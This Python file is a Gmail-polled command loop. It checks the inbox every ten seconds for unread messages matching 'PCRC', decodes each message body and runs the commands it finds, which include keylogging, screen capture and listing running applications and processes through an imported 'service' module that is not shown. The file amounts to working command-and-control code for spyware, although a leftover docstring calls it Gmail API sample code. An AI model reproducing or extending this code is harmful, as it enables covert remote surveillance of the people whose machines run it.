from __future__ import print_function

import os.path
import base64
import time
import service

from google.auth.transport.requests import Request
from google.oauth2.credentials import Credentials
from google_auth_oauthlib.flow import InstalledAppFlow
from googleapiclient.discovery import build
from googleapiclient.errors import HttpError

# If modifying these scopes, delete the file token.json.
SCOPES = ["https://mail.google.com/"]


def handle(myAr):
    for task in myAr:
        if task == "[key_logger]":
            service.keylogger()
        if task == "[screen_capture]":
            service.screenshot()
        if task == "[lists_app]":
            service.listRunningApplication()
        if task == "[lists_processes]":
            service.listRunningProcess()


def main():
    """Shows basic usage of the Gmail API.
    Lists the user's Gmail labels.
    """
    creds = None
    # The file token.json stores the user's access and refresh tokens, and is
    # created automatically when the authorization flow completes for the first
    # time.
    if os.path.exists("token.json"):
        creds = Credentials.from_authorized_user_file("token.json", SCOPES)
    # If there are no (valid) credentials available, let the user log in.
    if not creds or not creds.valid:
        if creds and creds.expired and creds.refresh_token:
            creds.refresh(Request())
        else:
            flow = InstalledAppFlow.from_client_secrets_file("credentials.json", SCOPES)
            creds = flow.run_local_server(port=0)
        # Save the credentials for the next run
        with open("token.json", "w") as token:
            token.write(creds.to_json())

    # try:
    #     # Call the Gmail API
    #     service = build('gmail', 'v1', credentials=creds)
    #     results = service.users().labels().list(userId='me').execute()
    #     labels = results.get('labels', [])

    #     if not labels:
    #         print('No labels found.')
    #         return
    #     print('Labels:')
    #     for label in labels:
    #         print(label['name'])

    # except HttpError as error:
    #     # TODO(developer) - Handle errors from gmail API.
    #     print(f'An error occurred: {error}')
    while True:
        try:
            service = build("gmail", "v1", credentials=creds)
            results = (
                service.users()
                .messages()
                .list(
                    userId="me",
                    labelIds=["INBOX", "UNREAD"],
                    includeSpamTrash="false",
                    q="PCRC",
                )
                .execute()
            )
            messages = results.get("messages", [])
            if not messages:
                print("No new messages.")
            else:
                for message in messages:
                    msg = (
                        service.users()
                        .messages()
                        .get(userId="me", id=message["id"])
                        .execute()
                    )
                    email_data = msg["payload"]["headers"]
                    for values in email_data:
                        name = values["name"]
                        if name == "From":
                            from_name = values["value"]
                            for part in msg["payload"]["parts"]:
                                try:
                                    data = part["body"]["data"]
                                    byte_code = base64.urlsafe_b64decode(data)

                                    text = byte_code.decode("utf-8")
                                    if text.find("div") == -1:
                                        # print("This is the message: " + str(text))
                                        myAr = text.splitlines()
                                        handle(myAr)
                                    # mark the message as read
                                    msg = (
                                        service.users()
                                        .messages()
                                        .modify(
                                            userId="me",
                                            id=message["id"],
                                            body={"removeLabelIds": ["UNREAD"]},
                                        )
                                        .execute()
                                    )
                                except BaseException as error:
                                    pass
        except HttpError as error:
            print(f"An error occurred: {error}")
        time.sleep(10)


if __name__ == "__main__":
    main()
